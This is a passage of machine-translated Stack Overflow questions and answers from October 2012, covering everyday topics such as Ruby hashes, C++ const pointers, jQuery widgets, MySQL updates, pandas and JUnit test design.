files = [{ "file" => "file.txt", "dir" => "/folder/file.txt" }] 
```

有没有办法遍历哈希 #2 并创建一个新的哈希，所以键是“文件名”和“路径”而不是“文件”和“目录”？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T04:11:07.407

只需用新密钥替换您的密钥：

```
files["path"] = files.delete("dir") 
```

`delete`返回删除的值，因此您有效地将*at*移动`files['dir']`到`files['path']`.

Ruby 中没有神奇的方法可以为您的两个数组自动执行此过程；您必须遍历第一个，在第二个中找到值，然后执行上述`delete`操作：

```
files1.each do |key,value|
  if old_key = files2.key(value)
    files2[key] = files2.delete(old_key)
  end
end 
```

如果键已经在第二个数组中，这有可能覆盖值。如果您确定 in 中的每个值`files1`也在 in 中`files2`，则可以跳过 if 语句并简单地`files2[key] = files2.delete(files2.find(value))`在循环内使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:41:35.990

尝试这个：

```
files1.concat(files2.map { |old_hash| 
    { 
        "filename" => old_hash["file"], 
        "path" => old_hash["dir"]
    }
}) 
```

# c++ - 指向常量的指针可以指向非常量对象-语言设计还是技术原因？

> ID：13061450
> 
> 赞同：6
> 
> 时间：2012-10-25T04:10:23.873
> 
> 标签：c++, pointers, constants

```
 //Example 1
    const double pie = 3.14;   //const object
    const double *cptr = &pie; //pointer-to-const to const object
    double *ptr = &pie;        //ERROR - non-pointer-to-const to const object

    //Example 2
    double pie = 3.14;         //non-const object
    const double *cptr = &pie; //non-pointer-to-const to non-const object
    double *ptr = &pie;        //non-pointer-to-const to non-const object 

```

最初我虽然允许指向非常量对象的常量指针，因为它只是意味着指向常量的指针不会改变非常量对象。

但是我刚刚在 c++ 书中读到，允许将指针指向非 const 对象的原因是因为指向 const 的指针无法真正知道它指向的对象是否是 const，所以它对待对象它指向 const 但按照相同的逻辑，非指向 const 的指针会将 const 对象视为非 const 对象，但编译器会在编译时抛出错误。

我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T04:37:54.760

声明一个 const 表示，“这个变量的值不应该改变。”

声明指向 const 的指针表示“我无意更改我指向的变量”。

* * *

**问题1：**为什么将指向变量的指针分配给const的地址时会出错？

```
// Example 1
const int i = 0;
int * p = &i;        /* Error */ 
```

**答：**因为第一行说，“请保证 的值`i`不会改变”，但是在第二行中编译器不能再做出保证——指针上的类型信息`p`不够严格，无法告诉编译器不要允许更改指向的值`i`。

* * *

**问题 2：**为什么将指向 const 的指针分配给变量的地址时不会出错？

```
// Example 2
int j = 0;
const int * q = &j;  /* No error */ 
```

**答案：**因为指向 const 的指针说，“请保证 的值`j`不会*通过`q`*”改变。请注意，*via`q`*很重要，因为指向 const 声明的指针并不意味着指向的值必须是常量，只是*使用指针的人不能使用指针来更改值*。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T04:17:08.083

**指向常量的指针**

```
const double *p 
```

将它指向的对象视为常量对象，即不允许您更改它。只要您取消引用指针

```
*p 
```

你正在处理一个常量对象。如果您尝试修改它，

```
*p = 1.0; 
```

您将收到来自编译器的错误消息。

**另一方面，指向非常量的指针**，

```
double *p 
```

将它指向的对象视为非常量，因此允许您修改其值：

```
*p = 1.0; 
```

变得合法。但是，如果在任何给定时间你有一个常量对象

```
const double d = 1.0; 
```

您将无法创建指向它的指向非常量的指针：

```
double *p = &d; 
```

不会被编译器接受。所以是的，编译器启用指向非常量的指针来修改它指向的对象。但它不能让您*创建指向常量 object 的非 const 指针*。因此，您不会遇到可以使用指向非 const 的指针来修改常量对象的情况。

关于标题中的问题：这主要是语言设计决定。然而，编译器可以依赖某些对象从不改变值的事实意味着各种优化是可能的。例如，如果同一个指针在函数中被解引用两次，而其他代码在两次解引用之间，并且如果该指针是指向 const 的指针，编译器将假定它实际上不必从内存中获取值两次，因为不允许在第一次和第二次取消引用之间更改该值。

# javascript - jQuery Widget Factory _trigger 实例

> ID：13061453
> 
> 赞同：4
> 
> 时间：2012-10-25T04:10:31.617
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-widget-factory

当使用 _trigger 方法来触发事件时，我遇到了一个我一直在击中但未能正确掌握的障碍。

基本上，如果我的小部件有多个实例，则在同一页面上实例化的最后一个小部件优先于所有其他小部件。

我已经学会并成功地使用 $.extend 来创建实例独有的对象，但我对如何解决以下问题感到困惑：

如何正确使用 _trigger 方法，以便在每个实例的基础上启用它。

```
(function($) {
  $.widget("a07.BearCal", {
    options: {  },
    _create: function() {
        _this = this;
        this.element.click(function() {
            _this._trigger("testTrig");
        });
    },
  });
})(jQuery);

// Instantiate widget on .full
$('.full').BearCal({
    testTrig: function() {
        console.log("testTrig event: full");
    }
});

// Instantiate widget on .mini
$('.mini').BearCal({
    testTrig: function() {
        console.log("testTrig event: mini");
    }
}); 
```

示例：http: [//jsfiddle.net/NrKVP/13/](http://jsfiddle.net/NrKVP/13/)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T04:25:59.270

您有一个意外的全局变量：

```
_this = this; 
```

这意味着插件的两个实例都将它们`this`放入构造函数中的相同（全局）`_this`中。结果是所有插件实例都使用`this`最后一个绑定。你要这个：

```
var _this = this; 
```

演示：http: [//jsfiddle.net/ambiguous/9NQNz/](http://jsfiddle.net/ambiguous/9NQNz/)

# javascript - Phonegap + Jquery 应用程序：脚本需要时间加载？

> ID：13061455
> 
> 赞同：0
> 
> 时间：2012-10-25T04:10:50.467
> 
> 标签：javascript, jquery, cordova

我正在构建一个 phonegap + JQM 应用程序。我有一个 loader.html，它是应用程序启动时显示的第一个文件。在这个文件中，我链接了所有的 js 文件。外部 js 文件的加载比预期的要长一点，大约 5-6 秒。只有这样它才会从加载程序文件转到我的主页。这是加载文件的正确方法吗？我有以下内容：

```
<script src="js/jquery.js"></script>
<script src="js/jquery.mobile.js"></script>
<script src="cordova-1.8.1.js"></script>
<script src="js/iscroll.js"></script>
<script src="js/childbrowser.js"></script>
<script src="js/swipe.js"></script>
<script src="js/barcodescanner.js"></script>
<script src="js/app.js" ></script>
<script src="js/dbaccess.js"></script>
<script src="js/FBConnect.js"></script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:30:20.397

加载脚本没有问题。你可以使用两种技术。 `combine`并`minify`提高您的应用程序的性能。

**COMBINE** 这个用于将多个外部文件合并为一个。它将减少下载脚本文件的请求数量

**MINIFY** 这个对你的 JavaScript 执行一些优化以删除空格、缩短变量名和删除未使用的代码。

请参阅此链接以获取缩小工具 [将多个 javascript 文件合并为一个的工具...](https://stackoverflow.com/questions/4947231/tool-to-combine-javacripts-files-into-one)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:52:29.037

使用缩小版的 JavaScript 文件是解决此问题的更好选择。

JavaScript 中的缩小是从源代码中删除所有不必要字符而不更改其功能的过程。这些不必要的字符通常包括空白字符、换行符、注释，有时还包括块分隔符，这些字符用于增加代码的可读性，但不是执行代码所必需的。我们有很多在线缩小工具。

[JS 压缩](http://jscompress.com/ "JS压缩")
[YUI 压缩器](http://developer.yahoo.com/yui/compressor/ "YUI 压缩机")

[这](http://www.devcurry.com/2009/11/7-free-tools-to-minify-your-scripts-and.html "7个免费工具来缩小你的脚本")是用于缩小的免费工具列表。

注意：在缩小脚本之前，请确保每行都以分号结尾，否则可能会出现问题。

# c - 程序中的杂散字符

> ID：13061457
> 
> 赞同：0
> 
> 时间：2012-10-25T04:11:06.253
> 
> 标签：c, compiler-construction

我的教授给了我们一些代码，并说它应该能够编译，但是我遇到了各种各样的错误，我不知道出了什么问题，因为我对 c 没有任何经验。它是一个汇编语言类，我们应该编写汇编代码来匹配 c 代码正在做的事情。他告诉我们用c运行程序来感受一下。

```
#include <stdio.h>
#define  SIZE  40

main()
{
int v[SIZE];
register int gap, i, j, temp;

/*  Initialize array to random positive integers mod 256  */
for (i = 0; i < SIZE; i++)
    v[i] = rand() & 0xFF;

/*  Display the unsorted array  */
for (i = 0; i < SIZE; i++)
    printf(“v[%-d] = %-d\n”, i, v[i]);

/*  Sort the array using a shell sort  */
for (gap = SIZE / 2; gap > 0; gap /= 2) {
    for (i = gap; i < SIZE; i++) {
        for (j = i - gap; j >= 0 && v[j] > v[j + gap]; j -= gap) {
            /*  Exchange out of order items  */
            temp = v[j];
            v[j] = v[j + gap];
            v[j + gap] = temp;
        }
    }
}

/*  Display the sorted array  */
for (i = 0; i < SIZE; i++)
    printf(“v[%-d] = %-d\n”, i, v[i]);
} 
```

我得到的错误是第 15 行和第 31 行中的错误，所以每一行都有一个 printf。

```
As3.c: In function ’main’:
As3.c:15: error: stray ’\223’ in program
As3.c:15: error: expected expression before ’%’ token 
As3.c:15: error: expected expression before ’%’ token
As3.c:15: error: stray ’\’ in program
As3.c:15: error: stray ’\224’ in program
As3.c:31:error: stray ’\223’ in program
As3.c:31:error: expected expression before ’%’ token
As3.c:31:error: expected expression before ’%’ token
As3.c:31:error: stray ’\’ in program
As3.c:31:error: stray ’\224’ in program 
```

任何帮助都会得到帮助，我相信它一定很简单，但我是 c 的菜鸟。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-25T04:13:58.597

# javascript - CGI Perl - 在加载时加载 Javascript，但仅在特定条件下

> ID：13061462
> 
> 赞同：-2
> 
> 时间：2012-10-25T04:11:50.950
> 
> 标签：javascript, perl, cgi, onload

我有一个仅在单击特定链接时显示的表单，并且许多下拉菜单的选项由 javascript 填充。

我需要在表单加载时运行这个 javascript，但我只能找到将它放在元素中的示例，据我了解，CGI Perl 在 start_html 函数中创建标签。

有没有一种方法可以仅在显示表单时触发 javascript 函数？

编辑：表单有两行下拉菜单。javascript 根据第一行的 selectedIndex 值填充第二行的选项。我希望在页面加载时根据第一行中的默认值填充第二行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:40:06.793

如果填充字段的 JavaScript 函数也被包含（或不包含）表单的相同逻辑有条件地包含，那么您可以测试该函数是否存在，如果存在则调用它：

```
if (typeof yourFunction === "function") {
    yourFunction();
} 
```

如果您的函数一直存在（也许它位于页面中始终包含的外部 JS 文件中），则为您的表单提供一个 id（如果它还没有）：

```
<form id="someIdHere" ...> 
```

然后你可以测试表单是否存在并调用你的函数来做人口：

```
if (document.getElementById("someIdHere")) {
    //form exists, so call:
    yourFunction();
} 
```

在任何一种情况下，我展示的 JS 代码都需要位于`onload`处理程序内部或出现在表单之后的脚本块中，因为 JS 只能操作浏览器已经解析的元素。

（如果函数本身是在表单之后出现的脚本块中定义的，并且有条件地包含，那么您可以在定义后直接调用它。）

# asp.net-mvc - 如何在 _SiteLayout.cshtml 页面中显示动态生成的菜单？

> ID：13061464
> 
> 赞同：0
> 
> 时间：2012-10-25T04:12:00.910
> 
> 标签：asp.net-mvc, razor

是否可以显示数据库内容`_layout.cshtml`？

我有`menu`表格`roleMenu`，我想根据数据库记录显示不同的菜单。

```
CREATE TABLE IF NOT EXISTS `menu` (
  `Id` INT NOT NULL AUTO_INCREMENT,
  `Name` VARCHAR(50) NOT NULL,
  `IconUrl` VARCHAR(200) NOT NULL,
  `ActionUrl` VARCHAR(200) NOT NULL,
  `ParentMenuId` INT NULL DEFAULT NULL,
  `Hide` boolean not null DEFAULT False,
  PRIMARY KEY (`Id`),
  CONSTRAINT `FK_menu_menu` FOREIGN KEY (`ParentMenuId`) REFERENCES `menu` (`Id`) ON DELETE CASCADE); 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:32:57.310

查看 Sumit Maitra 的这篇文章：http: [//www.dotnetcurry.com/ShowArticle.aspx? ID=811](http://www.dotnetcurry.com/ShowArticle.aspx?ID=811)

我认为，它将帮助您实现您正在寻找的东西

# php - PHP MySQL：更新增量条件可以重复

> ID：13061474
> 
> 赞同：0
> 
> 时间：2012-10-25T04:13:00.573
> 
> 标签：php, mysql

我有这样的声明：

```
UPDATE `MyTable` 
SET point = point + 1 
WHERE (mySubject = 'MATHEMATICS' AND myGrade = '100') OR 
      (mySubject = 'PHYSICS' AND myGrade = '75') OR 
      (mySubject = 'PHYSICS' AND myGrade = '75') 
```

我希望将表格更新为：

```
MATHEMATICS | 100 |  1
PHYSICS     | 75  |  2 
```

代替

```
PHYSICS     | 75  | 1 
```

出现重复的“物理”条件的原因是因为我从另一个函数中获取了这些信息。而且我想知道如果另一个函数通过我的 PHYSICS 2 次，我是否可以将 PHYSICS 点增加 2。

有没有办法在一个连接中执行此操作，而不是调用 UPDATE 3 次：

```
UPDATE `MyTable` SET point = point + 1 WHERE mySubject = 'MATHEMATICS' AND myGrade = '100'
UPDATE `MyTable` SET point = point + 1 WHERE mySubject = 'PHYSICS' AND myGrade = '75'
UPDATE `MyTable` SET point = point + 1 WHERE mySubject = 'PHYSICS' AND myGrade = '75' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:44:05.113

当您对表进行更新时，它只需要每行一次。所以它不会为物理生成 2 次更新...

```
 UPDATE `MyTable` 
SET point = point + 1 
WHERE (mySubject = 'MATHEMATICS' AND myGrade = '100') OR 
      (mySubject = 'PHYSICS' AND myGrade = '75') OR 
      (mySubject = 'PHYSICS' AND myGrade = '75') 
```

这个查询说的是 SQL .. 为我更新 MyTable WHERE (case a) or (case b) or (case c) 中的所有行

SQL 需要数学，并且在情况下它的 OK 和更新。然后它需要物理，在案例 b 中它们是好的并更新，然后是 sql FINISH，因为表中没有更多的 ROWS..

您必须进行 2 次单独更新才能完成您的工作。

```
UPDATE `MyTable` SET point = point + 1 WHERE mySubject = 'MATHEMATICS';
UPDATE `MyTable` SET point = point + 2 WHERE mySubject = 'PHYSICS'; 
```

或者你可以使用 CASE

```
UPDATE  `MyTable` SET point = 
        CASE
        WHEN mySubject = 'MATHEMATICS' THEN
                (point+1)
        WHEN mySubject = 'PHYSICS' THEN
                (point+2)
        END 
```

# openoffice-calc - 如何从Open Office 中的随机图像标签中提取文件名

> ID：13061475
> 
> 赞同：0
> 
> 时间：2012-10-25T04:13:05.987
> 
> 标签：openoffice-calc

我在 Open Office CSV 文件中有大约 1500 个项目，如下所示：

```
<a href=\http://localhost:81/rare_posts/?attachment_id=9044\"><img class=\"alignright size-medium wp-image-9044\" title=\"200064 British medical association\" src=\"http://localhost:81/books_posts/wp-content/uploads/British-medical-association-300x202.jpg\" alt=\"\" width=\"300\" height=\"202\" /></a> 
```

我需要做的是只找到图像（British-medical-association-300x202.jpg）并将其放入下一个单元格。我假设我必须有某种方法可以在 Open Office 中运行命令以查找所有**uploads/**实例，在此之后我们开始剥离所有文本并在**.jpg**处停止？

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T06:03:57.513

OpenOffice 没有通过正则表达式返回匹配项的公式函数。如果您在选项中启用正则表达式，它确实支持正则表达式搜索。

您可以使用两个公式来提取每个单元格的一次出现（不使用正则表达式搜索）。一个找到左端，一个找到右端：

假设数据在 A1 中

```
B1   =MID(A1;FIND("uploads/";A1)+8;LEN(A1))
C1   =LEFT(B1;FIND("\";B1)-1) 
```

如果每个单元格不止一次出现，您可以克隆公式并提供第`FIND`一个和第三个参数，从哪里开始搜索（第一次出现之后）。

# android - Android客户端使用Socket发送大文件，服务器接收到的文件不完整

> ID：13061476
> 
> 赞同：4
> 
> 时间：2012-10-25T04:13:23.627
> 
> 标签：android, sockets, streamwriter

我想通过套接字将一个大文件从 Android 发送到服务器，但服务器接收到的文件不完整。

安卓上的代码：

```
 Socket client = new Socket(ipStr, 4444);
 OutputStream  outputStream = client.getOutputStream();
 FileInputStream fileInputStream = new FileInputStream(file);
 BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream); 
 byte[] buffer = new byte[512];
 byte[] sendLen = getBytes(file.length(), true);
 outputStream.write(sendLen);   
 outputStream.flush();

 int count;

 while ((count = fileInputStream.read(buffer)) > 0)
 {
    outputStream.write(buffer, 0, count);
 }

 outputStream.flush();
 bufferedInputStream.close();
 outputStream.close();
 client.close(); 
```

服务器上的代码：

```
byte[] recvHead = new byte[8];
inStream.read(recvHead, 0, 8);
long recvLength =  getLong(recvHead, false);
FileOutputStream file =  new FileOutputStream(fileName, false);
byte[] buffer = new byte[8192];
int count = 0;

while (count < recvLength) {
    int n = inStream.read(buffer);                  
    if(n == -1)
        break;
    file.write(buffer, 0, n);
    count += n;                 
} 
```

但是服务器会在读取（缓冲区）中阻塞（android发送的文件约为30M）。

**这是奇怪的事情：** 当我在发送文件时向文件添加输出时，服务器可以正常工作。

```
 FileOutputStream file2 =  new FileOutputStream("/sdcard/testfile" , false);

 while ((count = fileInputStream.read(buffer)) >= 0)
 {
     outputStream.write(buffer, 0, count);
     outputStream.flush();

     file2.write(buffer, 0, count);
     file2.flush();

 } 
```

任何人都可以帮助我吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:24:48.970

您不能假设您像那样读取了 8 个长度字节。您可以只在长度数组中读取一个字节。我会为此使用 DataInputStream.readLong() ，并使用 DataOutputStream.writeLong() 来编写它。或者，当您在一个文件后关闭时，完全摆脱长度字并一直阅读直到 EOS。

其余的代码看起来没问题。如果接收方在 read() 中阻塞，则数据仍在发送，发送方仍在发送。

# python - 根据另一个列值更改 pandas DataFrame 列值

> ID：13061478
> 
> 赞同：7
> 
> 时间：2012-10-25T04:13:43.300
> 
> 标签：python, dataframe, pandas

我有一个数据框，其中有两列，每列代表一个有机体。它们被称为 ORG1 和 ORG2 我想将 ORG2 的值移动到 ORG1 中以获得相应的索引值。

因此，如果 ORG1 是“A”而 ORG2 是“B”，我希望 ORG1 从 ORG2 中获取值“B”。

我已经开始确定我想要移动的 ORG2 生物的索引，如下所示：

```
def move_org2(x):
    org2_matches = Series(x.ORG2.str.count("ESBL"))
    return x.ix[org2_matches == 1]

org2_DF = move_org2(DF)

org2_DF.ORG2.index 
```

使用此方法将 ORG1 值更改为相应 ORG2 索引处的值的最佳方法是什么

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-10-25T05:54:10.133

```
In [13]: df
Out[13]:
  ORG1  ORG2
0    A  ESBL
1    B     P
2    C     Q
3    D     R
4    E  ESBL

In [14]: cond = df.ORG2 == 'ESBL'

In [15]: df.ORG1[cond] = df.ORG2[cond]

In [16]: df
Out[16]:
   ORG1  ORG2
0  ESBL  ESBL
1     B     P
2     C     Q
3     D     R
4  ESBL  ESBL 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-09-12T05:33:17.887

换句话说，使用`.loc`你会做

```
In [2008]: df
Out[2008]:
  ORG1  ORG2
0    A  ESBL
1    B     P
2    C     Q
3    D     R
4    E  ESBL

In [2009]: df.loc[df['ORG2'] == 'ESBL', 'ORG1'] = df['ORG2']

In [2010]: df
Out[2010]:
   ORG1  ORG2
0  ESBL  ESBL
1     B     P
2     C     Q
3     D     R
4  ESBL  ESBL 
```

或者，如果您需要副本，无需修改 original `df`，您可以使用`.mask()`

```
In [2016]: df.mask(df['ORG2'] == 'ESBL', df['ORG2'], axis=0)
Out[2016]:
   ORG1  ORG2
0  ESBL  ESBL
1     B     P
2     C     Q
3     D     R
4  ESBL  ESBL 
```

# php - 如何在不扫描 .php 文件的情况下将翻译添加到 .po 文件

> ID：13061482
> 
> 赞同：1
> 
> 时间：2012-10-25T04:14:11.643
> 
> 标签：php, gettext, poedit

我只知道如何通过单击扫描 .php 文件的更新来使用 poedit 将翻译添加到 .po 和 .mo 文件。

我可以想到几个想要添加行而不必先扫描 .php 文件的原因，例如：能够同时处理 .php 文件和翻译。我试过了，但我找不到怎么做。显然，无法在 poedit 中进行操作，并且在 notepad++ 中打开 .po 和 .mo 文件会显示难以理解的图标。

如何才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T13:12:55.540

MO 文件是编译后的 PO 文件，您根本无法编辑它们。

您可以在文本编辑器中编辑 PO 文件，因为它们是纯文本。标题会告诉您文件使用的编码，因此如果您看到乱码文本，则更有可能您在编辑器中的编码是错误的。默认值为 ISO-8859-1，大多数 PO 文件现在使用 UTF-8。

也就是说，您手动编辑需要自动生成的文件的原因仅在您的测试和调试时才有效，在这种情况下，文本编辑器就可以了。如果您有一个可以突出显示 PO 文件格式的文本编辑器，这可能会有所帮助。

# php - 将数据插入到同一表单上的 2 个表中

> ID：13061488
> 
> 赞同：2
> 
> 时间：2012-10-25T04:14:55.637
> 
> 标签：php, mysql, insert

我有 3 张桌子：

```
Tbl_1\. Tour_Journey

id | title | tour_id | hotel_list | content | 
----------------------------------------

Tbl_2\. Hotel

id | hotel_name | rating | address |
------------------------------------

Tbl_3\. Hotel_in_Journey

id | journey_id | hotel_id | hotel_name |
--------------------------------------- 
```

`hotel_list`Tbl_1 的字段从 Tbl_2 检索数据并插入到 Tbl_3 和 Journey_id.Tbl_3 = id.Tbl_1

如何在同一个 Web 表单上将数据插入 Tbl_1 和 Tbl_3？还是循序渐进？在 web 表单上，hotel_list 字段可以选择多个值，但我不知道如何在 Tbl_3 中插入​​多行？

# php - PHP同步进程

> ID：13061495
> 
> 赞同：2
> 
> 时间：2012-10-25T04:16:51.563
> 
> 标签：php, ajax

我为我的应用程序创建了一个仪表板，其中包含多个小部件。每个小部件都有自己对应的功能。在仪表板的初始加载期间，所有小部件都通过带有 ajax 的 $(document).ready() 调用它们自己的函数。这种情况的问题是一次只执行一个函数，并且只有在成功执行第一个函数之后才执行第二个函数，同样所有剩余的函数都被执行。如果我有 10 个小部件，那么所有小部件都会一个接一个地显示。

我需要根据执行时间同时执行所有功能。我的意思是一个小部件不应该等待其他小部件完成，而是必须在其功能完成时同时处理和显示结果。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T03:15:47.657

最后我得到了上述问题的答案，

我正在使用基于文件的会话，因此 PHP 将为每个请求锁定会话文件并保持该锁定，直到脚本终止/退出。

如果我们需要在我们的脚本中解锁 PHP Session 文件，我们可以`session_write_close()`在我们的脚本中使用。这将解锁会话文件并将其用于该实例。

同时，该`session_write_close()`函数会将所有请求作为串行请求，因为所有请求都在为同一个会话文件而苦苦挣扎。

所以`session_write_close()`，我已经纠正了我的问题。

感谢@kalpeshpatel 和@iJD 的回复。

# python - 为什么在尝试读取 MNIST 数据时出现 EOFError 错误？

> ID：13061496
> 
> 赞同：0
> 
> 时间：2012-10-25T04:16:53.750
> 
> 标签：python, pybrain

```
import cPickle, gzip, numpy

data = cPickle.load(gzip.open('mnist.pkl.gz', 'rb'))
trndata=data['train']
tstdata=data['test'] 
```

运行此代码时出现此错误：

```
Traceback (most recent call last):      
File "/home/converge_2_min/trainer.py", line 12, in <module>        
data = cPickle.load(gzip.open('mnist.pkl.gz', 'rb'))    
EOFError 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-29T04:43:27.803

我在 Windows 上的 Cygwin 和 anaconda 上有同样的问题。这是我的 pkl 文件 (Cygwin) $ md5sum mnist.pkl.gz a02cd19f81d51c426d7ca14024243ce9 *mnist.pkl.gz

解压后：$ md5sum mnist.pkl 533096469a4f4dbb70a78fdee468939a *mnist.pkl

在 Ubuntu 上：$ md5sum mnist.pkl 533096469a4f4dbb70a78fdee468939a mnist.pkl

因此，在基于 Windows 的 python 安装中，cPickle 似乎是一个问题。

# matlab - 如何保持我粘贴到 word 的 MATLAB 代码的格式？

> ID：13061500
> 
> 赞同：4
> 
> 时间：2012-10-25T04:17:16.283
> 
> 标签：matlab

我正在尝试将我在 MATLAB 中编写的代码复制并粘贴到 word 中，但它会自动将代码重新格式化为黑白并更改制表符/间距。有没有办法以相同的格式复制和粘贴它？我通过我的大学在虚拟机上运行 MATLAB，所以不幸的是，我发现 Google 上建议的许多方法都不起作用。

我想这个问题已经被问过了，但似乎大多数复制/粘贴问题都与图表有关。我还没有看到任何关于代码格式的信息，但是如果有我错过的帖子，请指出。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T04:28:10.243

m 文件是纯文本文件，您看到的语法高亮是由 MATLAB 编辑器完成的，颜色编码信息不会保存为 m 文件本身的一部分。所以没有办法让简单的复制粘贴来保留语法突出显示。

至于间距，您可以通过将 Word 文件中的字体设置为等宽字体而不是等宽字体来获得满意的结果。

但是您最好的选择是使用该[`publish`](http://www.mathworks.com/help/matlab/ref/publish.html)功能导出 m 文件。它甚至可以`doc`直接导出为格式，或者您可以导出到`html`然后让 Word 导入它。

# sql - 是否有任何正确的 SQL 格式化模式？

> ID：13061508
> 
> 赞同：1
> 
> 时间：2012-10-25T04:18:22.097
> 
> 标签：sql, formatting

我想编写正确的 SQL 查询，我需要了解 SQL 格式的标准。我不是指逻辑或效率，我指的是正确的缩进和空格。在命令的情况下我也很有趣。

是否有任何正确的 SQL 格式化模式（标准）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:32:49.233

查看[数据库编码标准和指南](http://www.nyx.net/~bwunder/dbChangeControl/standard.htm)。它自 2008 年以来已经过时，但我还找不到更好的东西。几个月前我正在寻找这个，看起来真的很好。

我正在查看 oracle 和 mysql 站点，但“怪物”从未发表过正式论文。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:59:10.203

好吧，我现在不开始讨论大写表名，但通常你会考虑如何格式化选择/更新/插入/删除语句。在 Pablo Dominguez 的文档 giben 中，他们建议像这样格式化选择

```
select      t.Task_Id,
            t.Course_Id,
            t.Due_Dt,
            t.Start_Time,
            t.End_Time,
            t.Name,
            et.Completed_Flag,
            et.Completed_Dt
from BusyWork.dbo.TB_TASK t
inner join BusyWork.dbo.ENROLLMENTTASK et
on t.Task_Id = et.Task_Id
where t.Due_Dt >= @pStartDate
and t.Due_Dt <= @pEndDate
and et.Member_Id = @pMemberId
order by    t.Due_Dt,
            t.Start_Time 
```

我可以说（对我来说）阅读这样的脚本非常困难，尤其是其中的`from`部分，所以在我们的系统中，我们使用这样的约定

```
select
    t.Task_Id,
    t.Course_Id,
    t.Due_Dt,
    t.Start_Time,
    t.End_Time,
    t.Name,
    et.Completed_Flag,
    et.Completed_Dt
from BusyWork.dbo.TB_TASK as t
    inner join BusyWork.dbo.ENROLLMENTTASK as et on t.Task_Id = et.Task_Id
where
    t.Due_Dt >= @pStartDate and t.Due_Dt <= @pEndDate and
    et.Member_Id = @pMemberId
order by t.Due_Dt, t.Start_Time 
```

在`update`，`delete`语句中我总是试图写`from`子句，所以我总是可以很容易地重写`update`/`delete`来`select`测试它

```
update BusyWork.dbo.TB_TASK set
    Due_Dt = getdate(),
    Name = 'updated'
from BusyWork.dbo.TB_TASK as T
   inner join BusyWork.dbo.ENROLLMENTTASK as et on t.Task_Id = et.Task_Id
where
    t.Due_Dt >= @pStartDate and t.Due_Dt <= @pEndDate

delete BusyWork.dbo.TB_TASK
from BusyWork.dbo.TB_TASK as T
   inner join BusyWork.dbo.ENROLLMENTTASK as et on t.Task_Id = et.Task_Id
where
    t.Due_Dt >= @pStartDate and t.Due_Dt <= @pEndDate 
```

在`insert`语句中，我试图避免`values`从句，因此我也可以轻松地将语句重写为 plain `select`。始终在插入中明确指定列以避免在从表中添加/删除字段后出现问题。还尝试使用别名作为列名，以便在使用普通测试时检查正确的值`select`

```
insert into BusyWork.dbo.TB_TASK
(
    Due_Dt,
    Name
)
select
    getdate() as Due_Dt,
    'New' as Name 
```

另一条规则 - 始终为列和表/视图/表函数使用别名。将来修改语句会更容易，并且可以帮助您在更改表架构时避免一些讨厌的错误。

# java - 设计 junit 测试用例 - 每个测试用例的预定义步骤

> ID：13061511
> 
> 赞同：0
> 
> 时间：2012-10-25T04:18:43.940
> 
> 标签：java, junit, code-design

我有兴趣了解如何设计我的 junit 测试用例，以便它们更具可读性和可维护性。这是问题所在 - 在我所有的 junit 测试用例中，我有一些预定义的步骤要执行，如下所示

```
public class MyTestClass {

private Service myService;

@Test
public void testCase1() {
    mockObjectX("A");
    mockObjectY(1);
    mockObjectZ("M", 1);

    myService.validate("value1", "value2");

}

@Test
public void testCase2() {
    mockObjectX("Q");
    mockObjectY(5);
    mockObjectZ("Z", 10);

    myService.validate("value3", "value4");

}

private void mockObjectZ(String value1, int value2) {
    //mock object Z
}

private void mockObjectY(Integer value) {
    //mock object Y
}

private void mockObjectX(String value) {
    //mock object X
}
} 
```

问题是如果我要添加一个新的测试用例，我需要确保新的测试用例调用 mockObjectX()、mockObjectY()、mockObjectZ()。有没有更好的方法（一种更易于维护的方法）来设计我的测试用例，以便添加新的测试用例变得更简单？

我认为 @Before 不能使用，因为 mock* 方法接受参数。

我能想到的一种方法是有一个类，其中包含模拟对象 X、Y 和 Z 所需的每个参数值的方法

```
public class MyTestClass {

private Service myService;

@Test
public void testCase1() {
    mockObjects(new TestCase1());
    myService.validate("value1", "value2");

}

@Test
public void testCase2() {
    mockObjects(new TestCase2());
    myService.validate("value3", "value4");

}

private void mockObjects(ServiceObjectMocker serviceObjectMocker) {
    //mock object x, y and z by calling respective methods from serviceObjectMocker   
}  

private class ServiceObjectMocker {

    protected Object[] getValuesForObjectZ() {
        //pass default values
        return new Object[] {};     
    }

    protected Integer getValuesForObjectY() {
        //pass default values
        return 1;
    }

    protected String getValuesForObjectX() {
        //pass default values
        return "A";
    }

}

private class TestCase1 extends ServiceObjectMocker {
    @Override
    protected String getValuesForObjectX() {
        return "B";    
    }  
}

private class TestCase2 extends ServiceObjectMocker {
    @Override
    protected String getValuesForObjectX() {
        //pass different values
        return "Q";
    }

    @Override
    protected Integer getValuesForObjectY() {
        //pass default values
        return 10;
    }

}
} 
```

这减少了编号。每个测试用例需要进行的方法调用次数。有更好的想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T09:14:00.913

